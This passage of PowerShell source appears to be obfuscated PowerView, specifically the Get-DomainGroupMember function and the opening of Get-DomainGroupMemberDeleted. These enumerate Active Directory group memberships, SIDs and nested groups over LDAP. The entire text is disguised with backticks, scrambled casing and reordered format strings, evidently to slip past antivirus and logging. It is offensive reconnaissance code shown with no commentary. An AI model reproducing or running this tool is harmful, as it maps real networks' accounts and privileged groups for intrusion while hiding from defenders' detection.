        [Parameter(PoSItION = 0, MaNdaTORY = ${t`Rue}, ValUeFroMpIpelinE = ${Tr`UE}, VAluEFrOMpipeLiNEBYproPeRTYNamE = ${T`Rue})]
        [Alias({"{0}{4}{5}{1}{2}{3}" -f'Di','uishe','dNam','e','st','ing'}, {"{0}{1}{2}{4}{3}" -f 'Sa','mAccoun','tN','me','a'}, {"{0}{1}"-f 'Na','me'}, {"{4}{2}{3}{0}{1}" -f 'gu','ishedName','ber','Distin','Mem'}, {"{1}{2}{0}" -f 'rName','Memb','e'})]
        [String[]]
        ${i`dEnT`ity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`A`in},

        [Parameter(PARameTeRsEtNamE = "ManUal`R`ec`UrSE")]
        [Switch]
        ${rEc`U`RSE},

        [Parameter(pARaMeTErSETnamE = "R`e`curs`euSiNgmATCH`iN`gR`ULe")]
        [Switch]
        ${r`Ecu`R`SE`US`INgMatcHiNG`R`ULe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Fil','ter'})]
        [String]
        ${Lda`p`FILTeR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADS','Path'})]
        [String]
        ${S`eaRc`HBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}" -f 'om','ainCon','troller','D'})]
        [String]
        ${SE`RV`Er},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{0}{2}"-f 'neL','O','evel'}, {"{0}{1}"-f 'Subt','ree'})]
        [String]
        ${SeaR`ChSCo`pE} = ("{0}{1}{2}" -f 'Su','btre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSulTPAgE`sI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERver`Timeli`miT},

        [ValidateSet({"{0}{1}" -f 'Dac','l'}, {"{0}{1}" -f'G','roup'}, {"{1}{0}"-f 'ne','No'}, {"{0}{1}" -f 'O','wner'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${Se`CURi`T`YMaS`kS},

        [Switch]
        ${TO`mBS`T`ONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`denT`Ial} =   ${5r0`VK}::"E`MPTy"
    )

    BEGIN {
        ${seaRc`HErar`gU`MeN`TS} = @{
            ("{1}{0}{2}" -f 'operti','Pr','es') = ("{6}{5}{4}{1}{3}{2}{0}" -f 'ame','me,d','nguishedn','isti','tna','mber,samaccoun','me')
        }
        if (${p`S`BOUNdpArAm`eTers}[("{1}{0}" -f 'in','Doma')]) { ${Se`ARch`eRARgum`en`TS}[("{1}{0}{2}" -f 'oma','D','in')] = ${dOm`A`In} }
        if (${PSbo`UnD`P`AR`AMeTeRS}[("{1}{0}{2}"-f'DAPFilte','L','r')]) { ${S`Ear`che`Ra`R`gUMEnts}[("{0}{2}{1}{3}"-f'L','APFil','D','ter')] = ${l`DAPFIL`TER} }
        if (${pSboUndP`A`RA`Mete`RS}[("{0}{3}{1}{2}"-f 'Searc','B','ase','h')]) { ${s`earcHe`R`ARguME`NTS}[("{0}{1}{3}{2}" -f'Sear','chBa','e','s')] = ${s`E`ARC`HbAse} }
        if (${p`sBo`Un`dPAr`AM`EtERS}[("{1}{0}" -f 'erver','S')]) { ${sEARC`h`ERArG`UmEnTs}[("{0}{1}{2}"-f 'Se','rve','r')] = ${sErV`eR} }
        if (${psBOUN`dPaRA`met`Ers}[("{3}{0}{2}{1}"-f 'earchS','ope','c','S')]) { ${S`EaRc`h`ErArgu`m`EntS}[("{0}{3}{2}{1}"-f 'S','cope','chS','ear')] = ${SEaR`ch`SC`OpE} }
        if (${pS`BOUndpA`RA`METeRs}[("{3}{2}{0}{1}"-f'Pag','eSize','lt','Resu')]) { ${SEar`CHERar`gUm`entS}[("{1}{0}{2}" -f'geSiz','ResultPa','e')] = ${REs`ULTp`Ag`E`size} }
        if (${ps`B`ouNDparAMet`e`Rs}[("{1}{2}{3}{0}"-f't','ServerT','imeLim','i')]) { ${s`earCherarGum`e`NTs}[("{4}{1}{0}{2}{3}" -f 'rTim','ve','eL','imit','Ser')] = ${SeRV`Er`TiM`el`imiT} }
        if (${Ps`Bo`UNDPa`RAMeT`ERs}[("{2}{1}{0}"-f 'stone','omb','T')]) { ${Se`A`RcHeR`ARgumEnTS}[("{1}{0}{2}"-f'n','Tombsto','e')] = ${to`M`Bsto`NE} }
        if (${P`sB`OUNDPaRAmete`Rs}[("{1}{0}{3}{2}"-f'de','Cre','tial','n')]) { ${Se`ARcher`A`RGuments}[("{2}{3}{0}{1}" -f 'e','dential','C','r')] = ${cre`D`eN`Tial} }

        ${adNaMearGu`mEN`TS} = @{}
        if (${PsB`oun`dPAraMET`erS}[("{0}{1}"-f 'Doma','in')]) { ${a`DNameA`RGUM`E`NTS}[("{2}{0}{1}" -f 'omai','n','D')] = ${dO`mA`in} }
        if (${psbOunD`Pa`R`AmE`Ters}[("{0}{1}"-f 'S','erver')]) { ${AdnA`MEArgUMen`TS}[("{0}{1}" -f 'Serv','er')] = ${SEr`V`eR} }
        if (${pSB`oundPA`Rame`TERs}[("{3}{2}{1}{0}" -f 'l','a','ti','Creden')]) { ${AdN`A`meA`RG`UmentS}[("{0}{1}{2}"-f 'Cred','enti','al')] = ${Cr`E`deN`TIAl} }
    }

    PROCESS {
        ${gRO`UPsE`Arc`HER} = &("{4}{3}{0}{1}{5}{2}" -f'main','S','r','Do','Get-','earche') @SearcherArguments
        if (${grO`UpsE`ARCHER}) {
            if (${PsboUn`DParA`m`Et`E`RS}[("{3}{2}{4}{0}{1}{6}{5}" -f 'ingM','atchingRu','U','Recurse','s','e','l')]) {
                ${SeA`R`ChE`RARguMe`N`TS}[("{1}{2}{0}"-f 'entity','I','d')] = ${i`dE`NTItY}
                ${S`E`ARCher`A`RGumEntS}['Raw'] = ${tr`Ue}
                ${gr`O`Up} = &("{4}{0}{3}{2}{1}" -f '-Do','up','inGro','ma','Get') @SearcherArguments

                if (-not ${GRO`Up}) {
                    &("{1}{3}{0}{2}" -f 'e-','Wri','Warning','t') ('[Ge'+'t'+'-Doma'+'inGr'+'oupMember] '+'Error'+' '+'se'+'a'+'rching'+' '+'f'+'or '+'grou'+'p '+'wi'+'th '+'ide'+'n'+'tity: '+"$Identity")
                }
                else {
                    ${grOu`pFouNDn`AmE} = ${GrO`Up}."Pro`pEr`TIeS".("{1}{0}" -f 'tem','i').Invoke(("{3}{0}{2}{1}"-f 'ac','ountname','c','sam'))[0]
                    ${G`R`OupFOu`N`ddN} = ${gr`o`Up}."Pr`oPErt`I`ES".("{0}{1}" -f'ite','m').Invoke(("{5}{4}{2}{1}{3}{0}" -f'ame','she','i','dn','gu','distin'))[0]

                    if (${PsB`oU`NdP`ARaMetErS}[("{1}{0}" -f 'n','Domai')]) {
                        ${GRO`U`Pfo`UnDdo`MaiN} = ${D`OmA`IN}
                    }
                    else {
                        
                        if (${GRoU`PFoUnD`dn}) {
                            ${GroUpf`ouND`d`OMaIN} = ${G`RoU`Pf`o`UNdDN}.("{3}{2}{0}{1}"-f'n','g','bStri','Su').Invoke(${g`RoUpfO`UND`DN}.("{1}{0}"-f'f','IndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    &("{0}{2}{1}"-f 'Write-V','bose','er') ('[Ge'+'t'+'-Doma'+'inGrou'+'pMem'+'be'+'r] '+'Us'+'in'+'g '+'LD'+'AP '+'mat'+'chi'+'ng '+'ru'+'le '+'to'+' '+'recur'+'se '+'on'+' '+"'$GroupFoundDN', "+'o'+'nly '+'u'+'ser '+'ac'+'c'+'ounts'+' '+'wi'+'ll '+'be'+' '+'re'+'tu'+'rned.')
                    ${GR`o`UpS`EaRCH`eR}."f`iLter" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${gRou`ps`e`A`RCHeR}."Pro`P`eRt`iesTolOAD".("{1}{0}{2}"-f 'Ran','Add','ge').Invoke((("{4}{3}{2}{1}{0}" -f'Name','d','she','stingui','di')))
                    ${mE`mBE`Rs} = ${G`ROuP`SeaRcH`eR}.("{0}{1}" -f'F','indAll').Invoke() | &("{1}{2}{3}{0}"-f 'ct','ForEach','-O','bje') {${_}."PrO`pErtI`Es"."DisTI`NgU`IshE`dN`Ame"[0]}
                }
                ${Nu`ll} = ${se`Ar`CHeRarGuM`enTS}.("{0}{1}"-f'Remo','ve').Invoke('Raw')
            }
            else {
                ${id`EN`TityF`I`lTEr} = ''
                ${f`iL`TeR} = ''
                ${idE`N`TItY} | &("{1}{0}{3}{2}" -f 'here','W','t','-Objec') {${_}} | &("{1}{0}{2}"-f 'rEac','Fo','h-Object') {
                    ${IDE`N`TiTyIN`S`TanCe} = ${_}.("{1}{0}{2}"-f 'a','Repl','ce').Invoke('(', '\28').("{0}{1}" -f'Rep','lace').Invoke(')', '\29')
                    if (${i`dEnTi`T`Y`inSTaNcE} -match ("{1}{0}" -f'S-1-','^')) {
                        ${iDEnt`iT`YfiLtEr} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${idEN`TiTYIn`S`TA`NCe} -match ("{1}{0}" -f'=','^CN')) {
                        ${IdEn`TiT`yF`I`lter} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${pS`BO`UNdPAraMe`TERS}[("{1}{0}" -f 'in','Doma')]) -and (-not ${PsBou`ND`pArAm`Et`ERs}[("{0}{3}{2}{1}"-f 'Sear','ase','B','ch')])) {
                            
                            
                            ${IDEnT`i`Ty`DoMAiN} = ${iDEn`T`iTy`I`NStAncE}.("{2}{0}{1}" -f 'in','g','SubStr').Invoke(${idE`N`Tit`Yi`NsTA`Nce}.("{1}{0}{2}"-f 'O','Index','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{0}{3}{2}{1}" -f 'Wri','ose','rb','te-Ve') ('[Get-DomainGro'+'up'+'Mem'+'b'+'er]'+' '+'Extr'+'act'+'ed '+'d'+'omai'+'n '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            ${se`ARCHe`RAR`GUm`ENTS}[("{0}{1}" -f'Doma','in')] = ${iden`TiTy`do`M`Ain}
                            ${gROU`PS`e`A`Rcher} = &("{4}{2}{1}{3}{0}" -f'er','arc','mainSe','h','Get-Do') @SearcherArguments
                            if (-not ${gROu`pSE`A`R`CHer}) {
                                &("{3}{1}{0}{2}" -f'arnin','e-W','g','Writ') ('[Get-'+'D'+'o'+'mainGrou'+'pMembe'+'r] '+'U'+'nabl'+'e '+'to'+' '+'retr'+'ieve'+' '+'doma'+'in '+'searcher'+' '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${i`deN`TitY`INS`TA`NcE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${GUiDBYtEStR`I`Ng} = (([Guid]${IDenT`ITyI`NST`An`CE}).("{0}{2}{1}"-f 'ToByte','rray','A').Invoke() | &("{4}{1}{3}{0}{2}" -f 'Obje','orEac','ct','h-','F') { '\' + ${_}.("{1}{0}{2}" -f'tr','ToS','ing').Invoke('X2') }) -join ''
                        ${i`d`eNTi`TyfIlter} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${ide`N`TiTyInSt`ANcE}.("{2}{1}{0}" -f's','in','Conta').Invoke('\')) {
                        ${CO`N`VeR`TED`i`denTITyin`st`ANcE} = ${i`De`NtitYI`N`StAnce}.("{0}{1}" -f 'Re','place').Invoke('\28', '(').("{0}{1}" -f'Replac','e').Invoke('\29', ')') | &("{2}{4}{1}{3}{0}" -f 'e','ADNa','Con','m','vert-') -OutputType ("{0}{2}{1}"-f'Cano','l','nica')
                        if (${CONV`E`RT`eDIDeNtI`TYiN`St`An`ce}) {
                            ${GRoUp`DOm`AIn} = ${Con`VeRtED`iDen`TiTyIns`T`AnCe}.("{0}{2}{1}"-f 'S','g','ubStrin').Invoke(0, ${c`oNve`RteDIdEN`T`ITyInsTaNCe}.("{1}{0}"-f'dexOf','In').Invoke('/'))
                            ${gR`oUP`NAME} = ${ide`NTi`TYIn`ST`ANce}.("{1}{0}" -f 't','Spli').Invoke('\')[1]
                            ${iDENtit`Yf`i`LTER} += "(samAccountName=$GroupName)"
                            ${SeARCh`erARGUm`e`NtS}[("{0}{1}"-f'Doma','in')] = ${G`RO`UPDOm`AIn}
                            &("{1}{4}{0}{3}{2}" -f 'er','Wri','e','bos','te-V') ('['+'Get-'+'Domai'+'nG'+'ro'+'upMember'+'] '+'Ext'+'r'+'acted '+'domain'+' '+"'$GroupDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${gr`OUP`sea`Rch`Er} = &("{1}{4}{3}{0}{2}" -f 'e','Get-Doma','r','earch','inS') @SearcherArguments
                        }
                    }
                    else {
                        ${i`dEnti`TYfILt`er} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${iDeNtIT`y`F`ilTeR} -and (${i`d`enTiTyfI`LtEr}.("{1}{0}" -f'm','Tri').Invoke() -ne '') ) {
                    ${fIl`T`ER} += "(|$IdentityFilter)"
                }

                if (${PS`BouNdPar`A`mEteRs}[("{0}{1}{2}{3}" -f 'LDAP','Fil','te','r')]) {
                    &("{3}{2}{0}{1}"-f'rbos','e','e-Ve','Writ') ('[Get'+'-DomainGroupM'+'emb'+'er'+'] '+'Usi'+'n'+'g '+'add'+'iti'+'o'+'nal '+'LDAP'+' '+'filter:'+' '+"$LDAPFilter")
                    ${FI`Lt`er} += "$LDAPFilter"
                }

                ${gr`OU`PSEa`R`ChEr}."FI`LteR" = "(&(objectCategory=group)$Filter)"
                &("{0}{3}{1}{2}"-f 'Wr','os','e','ite-Verb') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    ${rE`Sult} = ${grO`U`ps`EaRChEr}.("{1}{0}{2}"-f'ndO','Fi','ne').Invoke()
                }
                catch {
                    &("{2}{1}{3}{0}"-f 'ing','Wa','Write-','rn') ('[G'+'et-Do'+'mainGrou'+'pMem'+'be'+'r]'+' '+'E'+'r'+'ror '+'se'+'a'+'rc'+'hing '+'for'+' '+'gr'+'ou'+'p '+'wi'+'th '+'ident'+'it'+'y'+' '+"'$Identity': "+"$_")
                    ${meMBE`Rs} = @()
                }

                ${gROu`pF`Ou`Ndn`AmE} = ''
                ${Gr`OuPf`ouND`dn} = ''

                if (${R`eS`ULT}) {
                    ${Me`mb`erS} = ${r`eSu`lT}."P`Rope`RtiEs".("{1}{0}" -f 'tem','i').Invoke(("{1}{0}" -f 'ember','m'))

                    if (${MEMb`E`RS}."c`oUnT" -eq 0) {
                        
                        ${FIN`IS`hED} = ${f`AL`se}
                        ${b`O`TTOm} = 0
                        ${T`OP} = 0

                        while (-not ${fI`NiS`HED}) {
                            ${t`Op} = ${BO`TtOM} + 1499
                            ${MeMB`ER`RAngE}="member;range=$Bottom-$Top"
                            ${BoT`ToM} += 1500
                            ${N`ULl} = ${g`R`OupSEArC`her}."p`ROPErT`iEs`ToLOad".("{0}{1}"-f 'Clea','r').Invoke()
                            ${n`UlL} = ${GRO`Up`SEaR`cHer}."p`ROPErTIe`sTol`oad".("{0}{1}"-f'Ad','d').Invoke("$MemberRange")
                            ${n`ULl} = ${G`Ro`Ups`eA`RCheR}."p`Rop`ERT`IEsT`oloAD".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{3}{2}{4}" -f 'ma','sa','countna','c','me'))
                            ${Nu`lL} = ${G`ROup`S`Ea`RchEr}."pRoPeRti`E`STo`LoaD".("{0}{1}" -f'A','dd').Invoke(("{3}{4}{1}{0}{2}" -f'na','ed','me','distin','guish'))

                            try {
                                ${REs`ULt} = ${gr`oup`seAr`chER}.("{1}{0}{2}"-f'dOn','Fin','e').Invoke()
                                ${ra`NgeDPR`o`Per`TY} = ${Re`suLt}."pr`OpERTi`eS"."prOpeR`TY`NaMeS" -like ("{2}{3}{0}{1}"-f 'nge=','*','membe','r;ra')
                                ${mEm`Bers} += ${R`es`ULt}."Pr`OperT`IEs".("{0}{1}"-f 'i','tem').Invoke(${ra`NG`E`DprO`PeRTY})
                                ${gr`OupFouND`N`AME} = ${reS`Ult}."p`ROpE`Rti`es".("{1}{0}" -f 'm','ite').Invoke(("{1}{3}{0}{2}{4}" -f'maccoun','s','t','a','name'))[0]
                                ${g`R`ouP`Fou`NDDn} = ${R`eSUlT}."P`ROperTI`eS".("{0}{1}" -f 'i','tem').Invoke(("{1}{0}{3}{2}" -f'st','di','guishedname','in'))[0]

                                if (${ME`MBE`Rs}."cO`UNt" -eq 0) {
                                    ${fiN`I`s`hed} = ${TR`Ue}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${f`InI`sheD} = ${T`RUE}
                            }
                        }
                    }
                    else {
                        ${gROUPf`O`U`NDNAmE} = ${r`Es`UlT}."PROp`ErT`i`Es".("{1}{0}"-f 'em','it').Invoke(("{3}{0}{2}{1}" -f'un','me','tna','samacco'))[0]
                        ${GRoUPf`OuN`dDn} = ${R`Es`Ult}."pRO`P`eRTiES".("{1}{0}"-f 'm','ite').Invoke(("{1}{2}{0}{3}"-f'a','dist','inguishedn','me'))[0]
                        ${meM`BeRS} += ${Re`sU`Lt}."pR`OPERt`ies".("{1}{0}" -f'm','ite').Invoke(${R`Ang`eDPROPeR`Ty})
                    }

                    if (${ps`BoU`NdParamETe`Rs}[("{1}{0}"-f'main','Do')]) {
                        ${Gr`OUPF`OUnDDom`A`iN} = ${DomA`In}
                    }
                    else {
                        
                        if (${gr`OupfO`U`NDdN}) {
                            ${Gro`Up`FOU`NddOMAin} = ${G`ROup`FOUN`D`dn}.("{0}{2}{1}"-f'Sub','ing','Str').Invoke(${Gr`o`UPFOuNDDN}.("{0}{2}{1}"-f'Inde','f','xO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${Mem`BeR} in ${mE`Mb`erS}) {
                if (${Re`cu`Rse} -and ${usE`MATch`I`NgRULE}) {
                    ${pR`oPERTi`Es} = ${_}."pR`Ope`Rt`iES"
                }
                else {
                    ${OB`jEcTsEa`RCHE`Ra`Rgu`meNtS} = ${SEARChErarG`UME`N`Ts}.("{0}{1}" -f'Clon','e').Invoke()
                    ${OBjeCT`SeArCH`erA`R`gumEN`Ts}[("{0}{1}" -f 'Ide','ntity')] = ${M`EMbEr}
                    ${o`BJE`CTSeARcHER`ARGuME`NtS}['Raw'] = ${T`Rue}
                    ${OBje`CtsEAr`C`HERarGUMEN`TS}[("{1}{0}{2}" -f'pert','Pro','ies')] = ("{4}{0}{1}{10}{2}{6}{8}{3}{5}{9}{11}{7}" -f'ishedname,cn',',','accountn','sid,','distingu','obj','ame,ob','class','ject','ec','sam','t')
                    ${Ob`JECt} = &("{3}{0}{2}{1}" -f'-Doma','ct','inObje','Get') @ObjectSearcherArguments
                    ${PRop`ert`IEs} = ${o`BJ`Ect}."prO`p`E`RTiEs"
                }

                if (${PR`O`p`eRtIeS}) {
                    ${GroupM`EM`B`Er} = &("{2}{1}{3}{0}"-f 'ect','w-Ob','Ne','j') ("{2}{0}{1}" -f 'e','ct','PSObj')
                    ${Gro`UpmEmb`ER} | &("{0}{1}{2}"-f'A','dd-Membe','r') ("{3}{2}{0}{1}" -f'propert','y','te','No') ("{0}{2}{3}{1}" -f 'Group','ain','D','om') ${gr`OuPf`ounD`dOm`A`IN}
                    ${G`RoUPm`E`MbER} | &("{1}{2}{0}"-f'ember','Ad','d-M') ("{2}{1}{0}" -f'y','propert','Note') ("{2}{1}{0}" -f 'me','oupNa','Gr') ${Gr`OUP`F`o`UNdnaME}
                    ${G`RO`UPmEmbeR} | &("{1}{0}{3}{2}" -f 'dd','A','r','-Membe') ("{1}{3}{0}{2}"-f'ert','Notepro','y','p') ("{4}{3}{0}{2}{1}"-f 'tingui','dName','she','upDis','Gro') ${GR`oupFOu`ND`dN}

                    if (${ProPEr`Ti`ES}."Objec`TS`Id") {
                        ${m`eM`BeRSid} = ((&("{3}{2}{0}{1}"-f'j','ect','b','New-O') ("{7}{9}{3}{10}{0}{4}{2}{1}{8}{5}{6}" -f'm','incipal.S','ity.Pr','t','.Secur','yI','dentifier','Sy','ecurit','s','e') ${pRoperT`i`ES}."obje`cT`siD"[0], 0)."va`lUE")
                    }
                    else {
                        ${M`Em`Be`RSid} = ${NU`Ll}
                    }

                    try {
                        ${memBEr`Dn} = ${P`R`OpE`RTIES}."diSt`InG`U`IShE`DnaME"[0]
                        if (${ME`MB`ERdn} -match ((("{11}{10}{9}{2}{1}{0}{6}{5}{3}{7}{4}{8}"-f 'a','yPrincip','Securit','{0}S-1','5-','s','l','-','21','n','g','Forei')) -F [ChaR]124)) {
                            try {
                                if (-not ${MeM`BER`sID}) {
                                    ${mE`m`Bers`Id} = ${P`Ro`Pe`RtIeS}."Cn"[0]
                                }
                                ${ME`MBeR`s`Imp`leNAME} = &("{1}{0}{2}" -f'DN','Convert-A','ame') -Identity ${mE`m`BErsID} -OutputType ("{2}{3}{0}{1}"-f 'pl','e','DomainS','im') @ADNameArguments

                                if (${MembE`R`SImplE`NAmE}) {
                                    ${mEMB`ER`D`OMAIN} = ${MEm`B`ersiM`pLEn`AME}.("{0}{1}"-f 'Spl','it').Invoke('@')[1]
                                }
                                else {
                                    &("{1}{2}{0}{3}" -f'-Warnin','Wr','ite','g') ('[Ge'+'t-Dom'+'ainGroup'+'Mem'+'ber] '+'E'+'r'+'ror '+'co'+'nve'+'r'+'ting '+"$MemberDN")
                                    ${M`EmBeRDO`mAIn} = ${n`ULl}
                                }
                            }
                            catch {
                                &("{1}{2}{0}" -f 'ing','Writ','e-Warn') ('[G'+'e'+'t-Do'+'mainGroupMember]'+' '+'Er'+'ror '+'co'+'nverti'+'ng '+"$MemberDN")
                                ${mEM`BE`RdOM`AIn} = ${NU`Ll}
                            }
                        }
                        else {
                            
                            ${MEmB`eRDO`MaiN} = ${me`mb`ErDn}.("{1}{0}{2}" -f'tr','SubS','ing').Invoke(${me`M`BErdn}.("{0}{1}{2}"-f 'In','dexO','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${M`Emb`ERdn} = ${n`Ull}
                        ${me`m`BeRd`O`MaiN} = ${Nu`ll}
                    }

                    if (${pro`peR`TI`eS}."SAMAC`cO`Un`TnAME") {
                        
                        ${ME`M`BeRn`AmE} = ${P`ROPE`RTiEs}."s`Am`Ac`cOuNtNa`Me"[0]
                    }
                    else {
                        
                        try {
                            ${mEMBERn`A`me} = &("{0}{2}{1}"-f'Con','D','vertFrom-SI') -ObjectSID ${P`ROp`erTieS}."c`N"[0] @ADNameArguments
                        }
                        catch {
                            
                            ${m`EmB`eRnAme} = ${P`Rop`Er`TIEs}."cn"[0]
                        }
                    }

                    if (${P`RopeRTi`Es}."OBJ`eC`TcL`Ass" -match ("{2}{0}{1}"-f'ompu','ter','c')) {
                        ${mE`mBer`obJE`CtC`laSS} = ("{1}{0}" -f 'ter','compu')
                    }
                    elseif (${pROp`E`RT`iES}."OB`JECTC`lA`sS" -match ("{0}{1}"-f 'gro','up')) {
                        ${me`MbER`obj`eCTCLA`Ss} = ("{1}{0}" -f 'roup','g')
                    }
                    elseif (${PRoPe`R`TIEs}."objEctC`lA`ss" -match ("{0}{1}"-f 'u','ser')) {
                        ${Me`m`BeROBJ`EcTc`L`AsS} = ("{1}{0}"-f 'er','us')
                    }
                    else {
                        ${ME`mBerOb`jECt`CLASs} = ${n`UlL}
                    }
                    ${gR`OupMEm`B`er} | &("{2}{0}{1}"-f 'd-','Member','Ad') ("{1}{3}{2}{0}" -f'property','N','te','o') ("{3}{0}{2}{1}" -f 'mbe','omain','rD','Me') ${M`eMbeR`Do`MaiN}
                    ${GR`oup`me`mBer} | &("{1}{0}{2}{3}"-f 'd-Me','Ad','mbe','r') ("{1}{0}{2}"-f'otep','N','roperty') ("{1}{2}{0}"-f 'mberName','M','e') ${membE`RN`A`Me}
                    ${GrOup`m`EmBeR} | &("{0}{1}{2}"-f'Add','-Mem','ber') ("{2}{1}{0}{3}" -f 'per','o','Notepr','ty') ("{0}{1}{6}{5}{3}{2}{4}"-f 'Membe','r','nguished','ti','Name','s','Di') ${ME`M`Berdn}
                    ${GRO`UPM`e`MBER} | &("{0}{2}{1}" -f 'A','ember','dd-M') ("{1}{2}{0}" -f'property','N','ote') ("{2}{4}{0}{1}{3}{5}"-f 'rOb','je','Memb','ct','e','Class') ${mEmb`E`RO`BjeCtcLa`sS}
                    ${gR`ou`PMeMb`ER} | &("{0}{2}{1}"-f 'A','-Member','dd') ("{3}{0}{1}{2}" -f'ep','rope','rty','Not') ("{1}{2}{0}" -f'berSID','M','em') ${ME`MB`ERsID}
                    ${G`ROUPMeM`BeR}."psOB`jE`Ct"."t`yPEN`AmEs".("{1}{0}"-f't','Inser').Invoke(0, ("{0}{3}{1}{2}" -f'PowerView','pMembe','r','.Grou'))
                    ${g`RoUp`m`eMbeR}

                    
                    if (${P`SBo`UN`dPA`RAM`eTErS}[("{0}{1}{2}"-f 'R','ec','urse')] -and ${ME`mBER`dn} -and (${m`eMBErOBJ`EcT`CL`Ass} -match ("{0}{1}"-f 'gro','up'))) {
                        &("{1}{2}{3}{0}" -f'e','Write','-Verbo','s') ('[Get-D'+'o'+'ma'+'inG'+'roupMemb'+'er'+'] '+'Ma'+'nu'+'ally '+'re'+'cursi'+'ng '+'o'+'n '+'g'+'roup'+': '+"$MemberDN")
                        ${S`eA`RcheR`Arg`U`mEntS}[("{2}{1}{0}" -f'y','t','Identi')] = ${mE`mbE`RDN}
                        ${nU`Ll} = ${S`EArcHeRa`Rgum`eNts}.("{1}{0}" -f'move','Re').Invoke(("{0}{3}{2}{1}"-f 'Prop','s','ie','ert'))
                        &("{2}{1}{5}{4}{0}{3}" -f 'e','e','G','mber','mainGroupM','t-Do') @SearcherArguments
                    }
                }
            }
            ${G`RO`UPse`ARchEr}.("{0}{1}{2}"-f 'dis','pos','e').Invoke()
        }
    }
}


function ge`T-domaInGr`ouPme`m`B`eRd`ELEtED {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{5}{4}{0}{6}" -f'nmen','PSU','eDeclaredVarsM','s','sig','oreThanAs','ts'}, '')]
    [OutputType({"{1}{5}{4}{7}{8}{0}{3}{9}{6}{2}"-f 'o','P','eted','mainGrou','wer','o','MemberDel','View','.D','p'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItION = 0, vALuEfRoMPipeLInE = ${T`RUe}, vaLUefRompIPeLineBYpRoPertyNamE = ${t`RUE})]
        [Alias({"{0}{3}{2}{4}{1}" -f'Distingu','me','sh','i','edNa'}, {"{4}{0}{3}{2}{1}" -f 'Acc','me','tNa','oun','Sam'}, {"{0}{1}"-f'N','ame'}, {"{1}{2}{0}{3}" -f 'istinguishe','Me','mberD','dName'}, {"{2}{0}{1}" -f'rNa','me','Membe'})]
        [String[]]
        ${ide`Nt`iTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`omAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'lte','Fi','r'})]
        [String]
        ${LDaPFi`LT`er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'A','SPath','D'})]
        [String]
        ${Sea`Rc`hBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}" -f 'oller','ntr','Domain','Co'})]
        [String]
        ${s`e`RveR},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{2}{0}{1}"-f 'eL','evel','On'}, {"{0}{1}{2}" -f 'S','ubtr','ee'})]
        [String]
        ${SeArC`hsC`OpE} = ("{0}{1}" -f'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`EsULtpA`GE`S`iZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`R`VERTi`mElIMit},

        [Switch]
        ${TO`mBS`ToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RED`eNtiAL} =   ${5r0VK}::"e`MpTY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${seaRc`HEr`ARG`Umen`TS} = @{
            ("{2}{1}{0}"-f 'es','roperti','P')    =   ("{1}{0}{5}{4}{6}{3}{2}" -f'ds-','ms','a','etadat','eplvalu','r','em'),("{2}{1}{4}{3}{0}"-f 'ame','stinguish','di','dn','e')
            'Raw'           =   ${T`RUE}
            ("{0}{1}{3}{2}" -f 'LDAPF','i','ter','l')    =   (("{3}{0}{6}{4}{2}{5}{1}" -f'Ca','p)','ory=gr','(object','eg','ou','t'))
        }
        if (${p`SBoundpa`RamET`Ers}[("{1}{0}" -f 'n','Domai')]) { ${sea`RcH`ER`A`Rg`UmEnts}[("{1}{2}{0}" -f 'n','Dom','ai')] = ${D`OmAin} }
        if (${P`SB`OuN`Dpa`Ra`meTERs}[("{0}{1}{2}"-f 'LDAP','Fil','ter')]) { ${sE`A`R`cher`ARGUmenTS}[("{1}{2}{0}" -f 'er','LD','APFilt')] = ${lDApf`I`L`TER} }
        if (${pSBOU`Ndp`AR`AM`E`TeRS}[("{3}{0}{1}{2}" -f'archBa','s','e','Se')]) { ${sEa`RC`hERa`RgUmeN`Ts}[("{0}{1}{2}" -f'Searc','hBa','se')] = ${s`Ea`RC`HbASe} }
        if (${P`S`BOU`N`dpAra`mETers}[("{1}{0}"-f'er','Serv')]) { ${sea`RCHERar`g`UME`Nts}[("{1}{0}"-f 'r','Serve')] = ${s`e`RvEr} }
